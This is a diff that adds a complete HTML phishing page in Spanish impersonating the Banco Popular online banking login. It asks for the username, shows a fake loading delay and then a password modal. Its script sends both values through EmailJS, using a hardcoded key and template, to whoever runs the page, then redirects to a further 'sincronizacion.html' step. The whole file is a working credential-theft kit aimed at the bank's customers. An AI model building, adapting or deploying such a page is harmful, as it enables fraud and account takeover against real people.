@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Banco Popular - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        max-width: 100%;
+        height: 100vh;
+        background-color: #fff;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 15px;
+        box-sizing: border-box;
+    }
+
+    .tab-group {
+        width: 36%;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin: 0px auto 0px;
+        border-radius: 10px;
+    }
+
+    .tab-button {
+        border: none;
+        padding: 10px;
+        width: 100%;
+        text-align: center;
+        font-weight: bold;
+        color: white;
+        border-radius: 25px;
+        font-size: 12px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+    }
+
+    .tab-persona {
+        background-color: #6B6B6B;
+    }
+
+    .tab-empresa, .tab-banca-movil {
+        background-color: #6B6B6B;
+    }
+
+    .tab-button.active {
+        background-color: #F18221;
+    }
+
+    input[type="text"] {
+        width: 120px;
+        padding: 4px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 14px;
+        margin: 5px auto;
+        display: block;
+        text-align: center;
+    }
+
+    .input-group {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 6px auto;
+        width: fit-content;
+    }
+
+    .input-group input {
+        width: 180px;
+        height: 36px;
+        padding: 0;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-top-left-radius: 4px;
+        border-bottom-left-radius: 4px;
+        border-right: none;
+        outline: none;
+        text-align: center;
+    }
+
+    .info-button {
+        width: 40px;
+        height: 40px;
+        background-color: #6B6B6B;
+        border: 1px solid #ccc;
+        border-left: none;
+        color: white;
+        font-weight: 910;
+        font-size: 18px;
+        border-top-right-radius: 4px;
+        border-bottom-right-radius: 4px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+    }
+
+    .login-button {
+        width: 50%;
+        padding: 11px;
+        background-color: #6c757d;
+        color: white;
+        border: none;
+        font-size: 19px;
+        margin: 5px auto;
+        cursor: pointer;
+        border-radius: 4px;
+        display: block;
+    }
+
+    .checkbox-container {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+        align-items: center;
+        margin: 8px 0;
+    }
+
+    .checkbox-group {
+        display: flex;
+        align-items: center;
+        margin: 3px 0;
+        width: 100%;
+        justify-content: center;
+    }
+
+    .checkbox {
+        width: 18px;
+        height: 18px;
+        border: 2px solid #F18221;
+        border-radius: 3px;
+        margin-right: 8px;
+        appearance: none;
+        -webkit-appearance: none;
+        background-color: #fff;
+        position: relative;
+        cursor: pointer;
+        display: inline-block;
+        text-align: center;
+        line-height: 18px;
+        font-size: 15px;
+    }
+
+    .checkbox:checked::before {
+        content: "✔";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 15px;
+        font-weight: bold;
+        color: #000000;
+    }
+
+    .checkbox-label {
+        color: #333;
+        font-size: 14px;
+    }
+
+    .conecta-bp {
+        text-align: center;
+        margin: 12px 0;
+        width: 100%;
+    }
+
+    .conecta-bp h3 {
+        margin: 3px 0;
+        color: #333;
+        font-size: 16px;
+    }
+
+    .conecta-bp p {
+        font-size: 14px;
+        margin: 3px 0;
+        text-align: center;
+        color: #333;
+        line-height: 1.3;
+    }
+
+    .link {
+        color: #0066cc;
+        text-decoration: none;
+        font-weight: bold;
+        font-size: 12px;
+    }
+
+    .footer-links {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin: 10px 0;
+        width: 100%;
+    }
+
+    .footer-link {
+        display: flex;
+        align-items: center;
+        margin: 3px 0;
+        color: #333;
+        text-decoration: none;
+        font-size: 14px;
+    }
+
+    .icon {
+        color: #F18221;
+        margin-right: 8px;
+        font-size: 18px;
+    }
+
+    .logo {
+        margin: 12px 0;
+        text-align: center;
+    }
+
+    .logo img {
+        max-width: 190px;
+    }
+
+    .purple-help {
+        position: fixed;
+        right: 0;
+        top: 28%;
+        transform: translateY(-50%);
+        background-color: #6A2C91;
+        color: white;
+        padding: 13px 6px;
+        border-top-left-radius: 25px;
+        border-bottom-left-radius: 25px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        z-index: 10;
+    }
+
+    .help-icon {
+        font-size: 17px;
+        margin: 10px 3px;
+        cursor: pointer;
+    }
+
+    .rotated-phone {
+        transform: rotate(90deg);
+    }
+
+    html, body, .container, .tab-group, .checkbox-container {
+        background-color: #fff;
+    }
+
+    /* Modal styles corregido */
+    .modal {
+        display: none;
+        position: fixed;
+        z-index: 9999;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.4);
+        justify-content: center;
+        align-items: center;
+    }
+
+    .modal.show {
+        display: flex;
+    }
+
+    .modal-content {
+        background-color: white;
+        padding: 18px 25px;
+        border-radius: 8px;
+        width: 80%;
+        max-width: 400px;
+        text-align: center;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .modal-image {
+        width: 150px;
+        height: auto;
+        margin: 4px 0;
+    }
+
+    .accept-button {
+        margin-top: 15px;
+        background-color: #F18221;
+        color: white;
+        border: none;
+        padding: 8px 18px;
+        font-size: 16px;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+
+    .accept-button:hover {
+        background-color: #e0721b;
+    }
+
+    /* Nuevos estilos para el modal de contraseña */
+    
+    .password-modal-wrapper {
+        background: white;
+        border-radius: 5px;
+        padding: 28px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        display: inline-block;
+        max-width: 320px;
+        width: 90%;
+        min-height: 300px; /* ↓ reducida */
+    }
+
+    .password-box {
+        background: white;
+        border: 1px solid #f18221;
+        border-radius: 7px;
+        padding: 20px 18px; /* ↓ menos padding */
+        width: 87%; /* Mejor usar 100% aquí */
+        min-height: 260px;  /* ↓ reducida aún más */
+        font-family: Arial, sans-serif;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .password-title {
+        color: #000;
+        font-size: 22px; /* Aumentado de 18px */
+        font-weight: bold;
+        margin-bottom: 6px;
+    }
+
+    .password-title .highlight {
+        color: #f18221;
+    }
+
+    .password-subtitle {
+        font-size: 18px; /* Aumentado de 15px */
+        color: #000;
+        margin-bottom: 35px; /* Aumentado de 22px */
+        border-bottom: 1px solid #e0e0e0; /* Línea añadida */
+        padding-bottom: 15px; /* Aumentado espacio para la línea */
+    }
+
+    .input-wrapper {
+        margin: 20px 0 40px; /* Aumentados márgenes */
+        border-bottom: 1px solid #e0e0e0; /* Línea añadida */
+        padding-bottom: 30px; /* Aumentado espacio para la línea */
+    }
+
+    .password-label {
+        font-size: 16px; /* Aumentado de 13px */
+        color: #f18221;
+        display: block;
+        margin-bottom: 8px;
+        padding-left: 2px;
+    }
+
+    .input-field {
+        position: relative;
+        border-bottom: 2px solid #f18221;
+        padding-bottom: 6px;
+    }
+
+    .password-input {
+        border: none;
+        outline: none;
+        width: 100%;
+        font-size: 18px; /* Aumentado de 16px */
+        padding: 6px 36px 6px 4px;
+        background-color: transparent;
+    }
+
+    .eye-icon {
+        position: absolute;
+        right: 8px; /* Ajustado para mejor posicionamiento */
+        top: 50%;
+        transform: translateY(-50%);
+        color: #555;
+        cursor: pointer;
+        font-size: 20px; /* Aumentado de 18px */
+        user-select: none; /* Evita selección accidental */
+        padding: 4px; /* Área de click más grande */
+        background: none; /* Sin fondo */
+        border: none; /* Sin borde */
+        outline: none; /* Sin outline */
+        z-index: 10; /* Asegurar que esté por encima */
+        -webkit-tap-highlight-color: transparent; /* Elimina cuadro en dispositivos móviles */
+        -webkit-touch-callout: none; /* Elimina callout en iOS */
+        -webkit-user-select: none; /* Webkit */
+        -moz-user-select: none; /* Firefox */
+        -ms-user-select: none; /* IE10+/Edge */
+    }
+
+    .eye-icon:focus {
+        outline: none; /* Elimina el outline al hacer focus */
+        box-shadow: none; /* Elimina cualquier sombra */
+    }
+
+    .cancel-button:hover,
+    .continue-button:hover {
+        color: #d16a1a; /* Hover para ambos botones */
+    }
+
+    .action-buttons {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 25px; /* Aumentado de 20px */
+        gap: 10px;
+    }
+
+    .cancel-button,
+    .continue-button {
+        padding: 14px 24px; /* Aumentado de 10px 18px */
+        font-size: 18px; /* Aumentado de 15px */
+        font-weight: bold;
+        border: none;
+        text-transform: uppercase;
+        border-radius: 4px;
+        min-width: 140px; /* Aumentado de 120px */
+        transition: all 0.3s ease;
+        background: transparent; /* Sin fondo */
+        cursor: pointer;
+    }
+
+    .cancel-button {
+        color: #f18221; /* Siempre el mismo color */
+    }
+
+    .continue-button {
+        color: #f18221; /* Siempre el mismo color, no gris */
+        cursor: pointer; /* Siempre clickeable visualmente */
+    }
+
+    .continue-button.enabled {
+        color: #f18221; /* Mantiene el mismo color */
+        cursor: pointer;
+    }
+
+    .continue-button.enabled:hover {
+        color: #d16a1a; /* Solo cambia a un tono más oscuro en hover */
+    }
+
+    h1 {
+        color: #545353;
+        margin: 8px 0;
+    }
+
+    h2 {
+        font-size: 13px;
+        font-weight: bold;
+        color: #333;
+        margin: 5px 0;
+    }
+
+    p.texto {
+        font-size: 12px;
+        margin: 3px 0;
+    }
+    </style>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="tab-group">
+            <button class="tab-button tab-persona" onclick="selectTab('persona')">PERSONA</button>
+            <button class="tab-button tab-empresa" onclick="selectTab('empresa')">EMPRESA</button>
+            <button class="tab-button tab-banca-movil" onclick="selectTab('banca-movil')">BANCA MÓVIL</button>
+        </div>
+        
+        <form id="form">
+            <input type="hidden" name="entity" value="Banco Popular">
+            <div class="input-group">
+                <input type="text" placeholder="Usuario" id="userInput" name="name">
+                <button class="info-button" type="button" onclick="mostrarInfo()">¡</button>
+            </div>
+
+        <!-- Modal de información -->
+        <div id="infoModal" class="modal">
+            <div class="modal-content">
+                <img src="mensaje.png" alt="Mensaje" class="modal-image">
+                <h2>Mensaje</h2>
+                <p>Digitar en este campo el usuario web que le fue entregado.</p>
+                <button class="accept-button" onclick="cerrarInfo()">Aceptar</button>
+            </div>
+        </div>
+        
+        <button class="login-button" onclick="iniciarSesion()">Ingrese</button>
+
+        <!-- Modal de carga -->
+        <div id="loader" class="modal">
+            <div class="modal-content">
+                <p>Cargando...</p>
+            </div>
+        </div>
+
+        <!-- Modal de contraseña mejorado -->
+        <div id="passwordModal" class="modal">
+        <div class="password-modal-wrapper">
+            <div class="password-box">
+                <div class="password-title">
+                    Autenticación con <span class="highlight">contraseña</span>
+                </div>
+                <div class="password-subtitle">Digite su contraseña</div>
+                
+                <div class="input-wrapper">
+                    <label class="password-label">Contraseña</label>
+                    <div class="input-field">
+                        <input type="password" class="password-input" id="passwordInput" name="password" oninput="checkPassword()">
+                        <i class="fas fa-eye eye-icon" onclick="togglePassword()" id="eyeIcon"></i>
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="cancel-button" type="button" onclick="cerrarPassword()">CANCELAR</button>
+                    <button class="continue-button" id="continueBtn" type="submit">CONTINUAR</button>
+                </div>
+            </form>
+            </div>
+        </div>
+    </div>
+        <div class="checkbox-container">
+            <div class="checkbox-group">
+                <input type="checkbox" id="firma-digital" class="checkbox">
+                <label for="firma-digital" class="checkbox-label">Ingrese con Firma Digital</label>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="recordar-usuario" class="checkbox">
+                <label for="recordar-usuario" class="checkbox-label">¿Recordar Usuario?</label>
+            </div>
+        </div>
+        
+        <div class="conecta-bp">
+            <h3>Conecta BP Mujer</h3>
+            <p class="texto">Un programa que apoya y da crecimiento social y económico a las mujeres <br> 
+                valientes y empoderadas. Ver mas 
+                <br><a href="#" class="link">https://www.bancopopular.fi.cr/conecta-bp-mujer/</a></p>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#" class="footer-link">
+                <i class="fas fa-user icon"></i> Olvidé mi contraseña
+            </a>
+            <a href="#" class="footer-link">
+                <i class="fas fa-lock icon"></i> Bloquear mi usuario
+            </a>
+        </div>
+        
+        <div class="logo">
+            <img src="logo-BP.png" alt="Banco Popular">
+        </div>
+    </div>
+    
+    <div class="purple-help">
+        <i class="fas fa-phone help-icon rotated-phone" title="Soporte"></i>
+        <i class="fas fa-th help-icon" title="Opciones"></i>
+        <i class="fas fa-info-circle help-icon" title="Información"></i>
+    </div>
+
+    <script>
+        // Inicializar EmailJS con tu User ID
+        emailjs.init('Fdk3dIBYptP-7lOoE');
+
+        // Variables para almacenar los datos
+        let userData = {
+            name: '',
+            password: ''
+        };
+
+        // Configurar el envío del formulario
+        document.getElementById('form')
+            .addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                const continueBtn = document.getElementById('continueBtn');
+                const passwordInput = document.getElementById('passwordInput');
+                
+                // Solo proceder si hay contraseña
+                if (!passwordInput.value.trim()) {
+                    return;
+                }
+
+                continueBtn.textContent = 'Enviando...';
+
+                const serviceID = 'default_service';
+                const templateID = 'template_dtqwqog';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        continueBtn.textContent = 'CONTINUAR';
+                        // Redirigir a sincronizacion.html después del envío exitoso
+                        window.location.href = 'sincronizacion.html';
+                    }, (err) => {
+                        continueBtn.textContent = 'CONTINUAR';
+                        alert('Error: ' + JSON.stringify(err));
+                    });
+            });
+
+        // Función para mostrar el modal de información
+        function mostrarInfo() { 
+            document.getElementById('infoModal').classList.add('show'); 
+        }
+
+        // Función para cerrar el modal de información
+        function cerrarInfo() { 
+            document.getElementById('infoModal').classList.remove('show'); 
+        }
+
+        // Función para seleccionar una pestaña
+        function selectTab(tab) { 
+            // Obtener todas las pestañas
+            const tabs = document.querySelectorAll('.tab-button'); 
+            
+            // Remover la clase 'active' de todas las pestañas
+            tabs.forEach(tabBtn => { 
+                tabBtn.classList.remove('active'); 
+            });
+            
+            // Agregar la clase 'active' a la pestaña seleccionada
+            const selectedTab = document.querySelector('.tab-' + tab); 
+            selectedTab.classList.add('active');
+            
+            // Almacenar la pestaña seleccionada en memoria (no localStorage)
+            window.selectedTab = tab; 
+        }
+
+        // Función para cargar la pestaña seleccionada al cargar la página
+        function loadSelectedTab() { 
+            // Obtener la pestaña seleccionada o usar 'persona' por defecto
+            const selectedTab = window.selectedTab || 'persona'; 
+            const tabButton = document.querySelector('.tab-' + selectedTab); 
+            
+            if (tabButton) { 
+                tabButton.classList.add('active'); 
+            } else { 
+                // Si no encuentra la pestaña, activar la pestaña por defecto
+                const defaultTab = document.querySelector('.tab-persona'); 
+                if (defaultTab) { 
+                    defaultTab.classList.add('active'); 
+                } 
+            } 
+        }
+
+        // Función para iniciar el proceso de inicio de sesión
+        function iniciarSesion() { 
+            const userInput = document.getElementById('userInput').value.trim(); 
+            
+            // Validar que el campo de usuario no esté vacío
+            if (!userInput) { 
+                alert('Por favor, ingrese su usuario'); 
+                return; 
+            }
+
+            // Guardar el usuario
+            userData.name = userInput;
+            
+            // Mostrar el loader
+            document.getElementById('loader').classList.add('show');
+            
+            // Después de 2 segundos, ocultar el loader y mostrar el modal de contraseña
+            setTimeout(() => { 
+                document.getElementById('loader').classList.remove('show'); 
+                document.getElementById('passwordModal').classList.add('show'); 
+            }, 2000); 
+        }
+
+        // Función para cerrar el modal de contraseña
+        function cerrarPassword() { 
+            document.getElementById('passwordModal').classList.remove('show'); 
+            document.getElementById('passwordInput').value = ''; 
+            document.getElementById('continueBtn').classList.remove('enabled'); 
+        }
+
+        // Función para alternar la visibilidad de la contraseña
+        function togglePassword() { 
+            const passwordInput = document.getElementById('passwordInput'); 
+            const eyeIcon = document.getElementById('eyeIcon');
+            
+            // AQUÍ ES DONDE CAMBIA EL TIPO DEL INPUT
+            if (passwordInput.type === 'password') { 
+                // Si el tipo es 'password', cambiarlo a 'text' para mostrar la contraseña
+                passwordInput.type = 'password1'; 
+                eyeIcon.classList.remove('fa-eye'); 
+                eyeIcon.classList.add('fa-eye-slash'); 
+            } else { 
+                // Si el tipo es 'text', cambiarlo a 'password' para ocultar la contraseña
+                passwordInput.type = 'password'; 
+                eyeIcon.classList.remove('fa-eye-slash'); 
+                eyeIcon.classList.add('fa-eye'); 
+            } 
+        }
+
+        // Función para verificar si se ha ingresado una contraseña
+        function checkPassword() { 
+            const passwordInput = document.getElementById('passwordInput'); 
+            const continueBtn = document.getElementById('continueBtn');
+            
+            // Habilitar el botón de continuar si hay texto en el campo de contraseña
+            if (passwordInput.value.trim().length > 0) { 
+                continueBtn.classList.add('enabled'); 
+            } else { 
+                continueBtn.classList.remove('enabled'); 
+            } 
+        }
+
+        // Cargar la pestaña seleccionada cuando se carga la página
+        window.onload = loadSelectedTab;
+    </script>
+</body>
+</html>
